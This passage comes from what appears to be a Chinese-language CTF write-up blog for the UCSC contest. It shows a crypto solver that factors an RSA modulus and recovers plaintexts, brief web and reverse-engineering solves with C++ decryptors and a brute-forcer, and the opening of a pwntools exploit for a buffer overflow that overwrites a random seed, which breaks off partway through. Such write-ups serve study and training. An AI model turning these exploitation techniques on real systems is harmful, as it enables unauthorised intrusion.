number\">24819077530766367166035941051823834496451802693325219476153953490742162231345380863781267094224914358021972805811737102184859249919313532073566493054398702269142565372985584818560322911207851760003915310535736092154713396343146403645986926080307669092998175883480679019195392639696872929250699367519967334248</span>\nproblem2 <span class=\"token operator\">=</span> <span class=\"token number\">20047847761237831029338089120460407946040166929398007572321747488189673799484690384806832406317298893135216999267808940360773991216254295946086409441877930687132524014042802810607804699235064733393301861594858928571425025486900981252230771735969897010173299098677357738890813870488373321839371734457780977243838253195895485537023584305192701526016</span>\nn <span class=\"token operator\">=</span> <span class=\"token number\">86262122894918669428795269753754618836562727502569381672630582848166228286806362453183099819771689423205156909662196526762880078792845161061353312693752568577607175166060900619163231849790003982326663277243409696279313372337685740601191870965951317590823292785776887874472943335746122798330609540525922467021</span>\nc <span class=\"token operator\">=</span> <span class=\"token number\">74962027356320017542746842438347279031419999636985213695851878703229715143667648659071242394028952959096683055640906478244974899784491598741415530787571499313545501736858104610426804890565497123850685161829628373760791083545457573498600656412030353579510452843445377415943924958414311373173951242344875240776</span>\n\nR <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">227</span><span class=\"token punctuation\">,</span> <span class=\"token number\">506</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1372</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3042</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6163</span><span class=\"token punctuation\">]</span>\nA <span class=\"token operator\">=</span> <span class=\"token number\">1253412688290469788410859162653</span>\nB <span class=\"token operator\">=</span> <span class=\"token number\">16036</span>\nM <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">10294</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12213</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10071</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4359</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1310</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4376</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7622</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14783</span><span class=\"token punctuation\">]</span>\nS_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">13523</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32682</span><span class=\"token punctuation\">,</span> <span class=\"token number\">38977</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44663</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43353</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31372</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17899</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17899</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44663</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16589</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40304</span><span class=\"token punctuation\">,</span> <span class=\"token number\">25521</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31372</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">999</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    e_pow_k <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n    term <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>problem1 <span class=\"token operator\">*</span> e_pow_k<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> n\n    candidate <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>problem2 <span class=\"token operator\">+</span> term<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> n\n    g <span class=\"token operator\">=</span> GCD<span class=\"token punctuation\">(</span>candidate<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> g <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n        p<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">)</span>\n        q<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">//</span>g<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">break</span>\n    \n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">%</span>p<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">%</span>q<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">tonelli_shanks</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    Q <span class=\"token operator\">=</span> p <span class=\"token operator\">-</span> <span class=\"token number\">1</span>\n    S <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">while</span> Q <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        Q <span class=\"token operator\">//=</span> <span class=\"token number\">2</span>\n        S <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n    z <span class=\"token operator\">=</span> Integer<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">while</span> kronecker_symbol<span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n        z <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n    M <span class=\"token operator\">=</span> S\n    c_val <span class=\"token operator\">=</span> power_mod<span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">,</span> Q<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n    t <span class=\"token operator\">=</span> power_mod<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> Q<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n    R <span class=\"token operator\">=</span> power_mod<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>Q <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n  \n    <span class=\"token keyword\">while</span> t <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n        i <span class=\"token operator\">=</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> M<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> power_mod<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span>i<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        b <span class=\"token operator\">=</span> power_mod<span class=\"token punctuation\">(</span>c_val<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token punctuation\">(</span>M <span class=\"token operator\">-</span> i <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n     \n        R <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>R <span class=\"token operator\">*</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> p\n        t <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>t <span class=\"token operator\">*</span> b <span class=\"token operator\">*</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> p\n        c_val <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">*</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> p\n        M <span class=\"token operator\">=</span> i\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span>Integer<span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> Integer<span class=\"token punctuation\">(</span>p <span class=\"token operator\">-</span> R<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">eth_root_prime</span><span class=\"token punctuation\">(</span>c_val<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> e_power<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">assert</span> e_power <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span>e_power <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"e 必须为 2 的幂\"</span>\n    k <span class=\"token operator\">=</span> e_power<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span>\n    roots <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>Integer<span class=\"token punctuation\">(</span>c_val<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> p<span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        new_roots <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">for</span> r <span class=\"token keyword\">in</span> roots<span class=\"token punctuation\">:</span>\n            r_mod <span class=\"token operator\">=</span> Integer<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> p\n            <span class=\"token keyword\">if</span> r_mod <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                new_roots<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>r_mod<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">if</span> r_mod <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n                    new_roots<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>p <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">if</span> kronecker_symbol<span class=\"token punctuation\">(</span>r_mod<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n                    sqs <span class=\"token operator\">=</span> tonelli_shanks<span class=\"token punctuation\">(</span>r_mod<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n                    new_roots<span class=\"token punctuation\">.</span>extend<span class=\"token punctuation\">(</span>sqs<span class=\"token punctuation\">)</span>\n        roots <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>Integer<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> new_roots<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> roots\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">recover_plaintexts</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">,</span> e<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    roots_p <span class=\"token operator\">=</span> eth_root_prime<span class=\"token punctuation\">(</span>c <span class=\"token operator\">%</span> p<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span>\n    roots_q <span class=\"token operator\">=</span> eth_root_prime<span class=\"token punctuation\">(</span>c <span class=\"token operator\">%</span> q<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span>\n    candidates <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> rp <span class=\"token keyword\">in</span> roots_p<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> rq <span class=\"token keyword\">in</span> roots_q<span class=\"token punctuation\">:</span>\n            m <span class=\"token operator\">=</span> crt<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>rp<span class=\"token punctuation\">,</span> rq<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>p<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            candidates<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> candidates\n\nm<span class=\"token operator\">=</span>recover_plaintexts<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span>\n\nA_inv <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">,</span> B<span class=\"token punctuation\">)</span>\nS_primes <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>S <span class=\"token operator\">*</span> A_inv<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> B <span class=\"token keyword\">for</span> S <span class=\"token keyword\">in</span> S_list<span class=\"token punctuation\">]</span>\n\nbits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> s_prime <span class=\"token keyword\">in</span> S_primes<span class=\"token punctuation\">:</span>\n    group_bits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    remaining <span class=\"token operator\">=</span> s_prime\n    <span class=\"token keyword\">for</span> r <span class=\"token keyword\">in</span> <span class=\"token builtin\">reversed</span><span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> remaining <span class=\"token operator\">>=</span> r<span class=\"token punctuation\">:</span>\n            group_bits<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            remaining <span class=\"token operator\">-=</span> r\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            group_bits<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    group_bits <span class=\"token operator\">=</span> group_bits<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    bits<span class=\"token punctuation\">.</span>extend<span class=\"token punctuation\">(</span>group_bits<span class=\"token punctuation\">)</span>\n\nflag2 <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    byte_bits <span class=\"token operator\">=</span> bits<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span>\n    byte <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">for</span> bit <span class=\"token keyword\">in</span> byte_bits<span class=\"token punctuation\">:</span>\n        byte <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>byte <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> bit\n    flag2<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">)</span>\n\nflag2 <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>flag2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag2 =\"</span><span class=\"token punctuation\">,</span> flag2<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> m<span class=\"token punctuation\">:</span>\n    f1<span class=\"token operator\">=</span>long_to_bytes<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f1<span class=\"token punctuation\">)</span>\n    Flags <span class=\"token operator\">=</span> <span class=\"token string\">'flag&#123;'</span> <span class=\"token operator\">+</span> md5<span class=\"token punctuation\">(</span>f1<span class=\"token operator\">+</span>flag2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token string\">'&#125;'</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Flags<span class=\"token punctuation\">)</span></code></pre>\n\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h3 id=\"ezLaravel-ucsc\"><a href=\"#ezLaravel-ucsc\" class=\"headerlink\" title=\"ezLaravel-ucsc\"></a><strong>ezLaravel-ucsc</strong></h3><p>Dirsearch出</p>\n<p><img src=\"/images/1745240699576-32.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>访问flag.php得到flag</p>\n<h1 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h1><h3 id=\"simplere-ucsc\"><a href=\"#simplere-ucsc\" class=\"headerlink\" title=\"simplere-ucsc\"></a>simplere-ucsc</h3><p>UPX壳，直接dbg+dump即可脱壳。</p>\n<p>Base58换表加密</p>\n<p><img src=\"/images/1745240699574-1.png\" alt=\"img\" loading=\"lazy\"></p>\n<p><img src=\"/images/1745240699574-2.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>数据倒转异或加密</p>\n<p><img src=\"/images/1745240699574-3.png\" alt=\"img\" loading=\"lazy\"></p>\n<pre class=\"language-C++\" data-language=\"C++\"><code class=\"language-C++\">#include &lt;iostream&gt;\n#include &lt;windows.h&gt;\n#include &lt;string&gt;\n#include &lt;vector&gt;\n\nunsigned __int64 decrypt(BYTE *encrypted, unsigned __int64 strlen_, BYTE *decrypted)\n&#123;\n    unsigned __int64 i;\n\n    for (i &#x3D; 0; i &lt; strlen_; i++)\n    &#123;\n        decrypted[strlen_ - i - 1] &#x3D; encrypted[i] ^ (i + 1);\n    &#125;\n    return i;\n&#125;\n\nint main()\n&#123;\n    unsigned char Enc[] &#x3D;\n        &#123;\n            0x72, 0x7A, 0x32, 0x48, 0x34, 0x4E, 0x3F, 0x3A, 0x42, 0x33,\n            0x47, 0x69, 0x75, 0x63, 0x7C, 0x7D, 0x77, 0x62, 0x65, 0x64,\n            0x7B, 0x6F, 0x62, 0x50, 0x73, 0x2B, 0x68, 0x6C, 0x67, 0x47,\n            0x69, 0x15, 0x42, 0x75, 0x65, 0x40, 0x76, 0x61, 0x56, 0x41,\n            0x11, 0x44, 0x7F, 0x19, 0x65, 0x4C, 0x40, 0x48, 0x65, 0x60,\n            0x01, 0x40, 0x50, 0x01, 0x61, 0x6F, 0x69, 0x57&#125;;\n\n    unsigned char Dec[100]&#123;&#125;;\n    decrypt((BYTE *)Enc, 58, (BYTE *)Dec);\n\n    printf(&quot;%.58s\\n&quot;, Dec);\n    return 0;\n&#125;\n&#x2F;&#x2F;mPWV7et2RTxobH5Tn8iqGSdFWc5vYzps1jHuynpvpfmsmxeL9K28H1L1xs</code></pre>\n\n<p><img src=\"/images/1745240699574-4.png\" alt=\"img\" loading=\"lazy\"></p>\n<h3 id=\"easy-re-ucsc\"><a href=\"#easy-re-ucsc\" class=\"headerlink\" title=\"easy_re-ucsc\"></a>easy_re-ucsc</h3><p><img src=\"/images/1745240699574-5.png\" alt=\"img\" loading=\"lazy\"></p>\n<p><img src=\"/images/1745240699574-6.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>异或加密</p>\n<pre class=\"language-c++\" data-language=\"c++\"><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;windows.h&gt;\n#include &lt;string&gt;\n#include &lt;vector&gt;\n\nint main()\n&#123;\n    unsigned char a[] &#x3D; &quot;n&#x3D;&lt;;:h2&lt;&#39;?8:?&#39;9hl9&#39;h:l&gt;&#39;2&gt;&gt;2&gt;hk&#x3D;&gt;;:?&quot;;\n    for (int i &#x3D; 0; i &lt; 36; i++)\n        a[i] ^&#x3D; 10;\n    printf(&quot;%.37s\\n&quot;, a);\n    &#x2F;&#x2F; d7610b86-5205-3bf3-b0f4-84484ba74105\n    return 0;\n&#125;</code></pre>\n\n<h3 id=\"EZ-debug-ucsc\"><a href=\"#EZ-debug-ucsc\" class=\"headerlink\" title=\"EZ_debug-ucsc\"></a>EZ_debug-ucsc</h3><p>断点此处单步运行得到flag</p>\n<p><img src=\"/images/1745240699574-7.png\" alt=\"img\" loading=\"lazy\"></p>\n<p><img src=\"/images/1745240699575-8.png\" alt=\"img\" loading=\"lazy\"></p>\n<h3 id=\"re-ez-ucsc\"><a href=\"#re-ez-ucsc\" class=\"headerlink\" title=\"re_ez-ucsc\"></a>re_ez-ucsc</h3><p>单步跟到主要函数</p>\n<p>这边循环输入字符，判断(Inputchar - 32)^3是否&lt;4，这边可以得出一共就四个符合条件的字符</p>\n<pre class=\"language-C++\" data-language=\"C++\"><code class=\"language-C++\">&#39; &#39;, &#39;!&#39;, &#39;\\&quot;&#39;, &#39;#&#39;</code></pre>\n\n<p>要经过一系列输入数据，并且数据变换最终要v0&#x3D;&#x3D;3，然后输出以下内容。</p>\n<p><img src=\"/images/1745240699575-9.png\" alt=\"img\" loading=\"lazy\"></p>\n<p><img src=\"/images/1745240699575-10.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>输入的字符串md5就是flag。</p>\n<p>那么直接爆破输入，让最后v0等于3即可得到目标系列字符串。</p>\n<pre class=\"language-c++\" data-language=\"c++\"><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;vector&gt;\n#include &lt;string&gt;\n#include &lt;functional&gt;\n\nint main()\n&#123;\n    unsigned long long k[5] &#x3D; &#123;\n        0xFFFFFFFFFFFFFFFB, 0x0000000000000005, 0xFFFFFFFFFFFFFFFF, 0x0000000000000001,\n        0x0000000000000000&#125;;\n\n    char chars[4] &#x3D; &#123;&#39;#&#39;, &#39;&quot;&#39;, &#39;!&#39;, &#39; &#39;&#125;;\n    for (int len &#x3D; 1; len &lt;&#x3D; 10; len++)\n    &#123;\n        std::vector&lt;std::vector&lt;int&gt;&gt; combinations;\n        std::vector&lt;int&gt; current(len);\n\n        std::function&lt;void(int)&gt; generate &#x3D; [&amp;](int pos)\n        &#123;\n            if (pos &#x3D;&#x3D; len)\n            &#123;\n                combinations.push_back(current);\n                return;\n            &#125;\n\n            for (int i &#x3D; 0; i &lt; 4; i++)\n            &#123;\n                current[pos] &#x3D; i;\n                generate(pos + 1);\n            &#125;\n        &#125;;\n\n        generate(0);\n\n        for (const auto &amp;comb : combinations)\n        &#123;\n            unsigned int map[25] &#x3D; &#123;\n                0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,\n                0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,\n                0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,\n                0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000001,\n                0x00000001, 0x00000001, 0x00000001, 0x00000001, 0x00000001&#125;;\n\n            unsigned long long v0 &#x3D; 1;\n            std::string a;\n            bool valid &#x3D; true;\n\n            for (int i &#x3D; 0; i &lt; len; i++)\n            &#123;\n                char c &#x3D; chars[comb[i]];\n                a.push_back(c);\n\n                uint8_t v &#x3D; c;\n                uint8_t v13 &#x3D; (v - 32) ^ 3;\n                v0 +&#x3D; k[v13];\n\n                if (v0 &gt; 0x18 || map[v0])\n                &#123;\n                    valid &#x3D; false;\n                    break;\n                &#125;\n\n                map[v0] &#x3D; 1;\n\n                if (v0 &#x3D;&#x3D; 3)\n                &#123;\n                    std::cout &lt;&lt; a &lt;&lt; std::endl;\n                    return 0;\n                &#125;\n            &#125;\n        &#125;\n    &#125;\n    return 0;\n&#125;\n&#x2F;&#x2F; &quot;&quot;&quot;  ###</code></pre>\n\n<p><img src=\"/images/1745240699575-11.png\" alt=\"img\" loading=\"lazy\"></p>\n<h1 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h1><h3 id=\"BoFido-ucsc\"><a href=\"#BoFido-ucsc\" class=\"headerlink\" title=\"BoFido-ucsc\"></a><strong>BoFido-ucsc</strong></h3><p>开始输入有溢出，可以把随机种子改为任意值。把种子设为0这样就能通关了</p>\n<p>exp</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"INFO\"</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token comment\">#io=process(\"./chal\")</span>\n<span class=\"token comment\">#io=remote(\"dicec.tf\", 32030)</span>\n\nr <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nrl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>    a<span class=\"token operator\">=</span><span class=\"token boolean\">False</span>        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nru <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>    <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\ns <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsa <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>a<span class=\"token 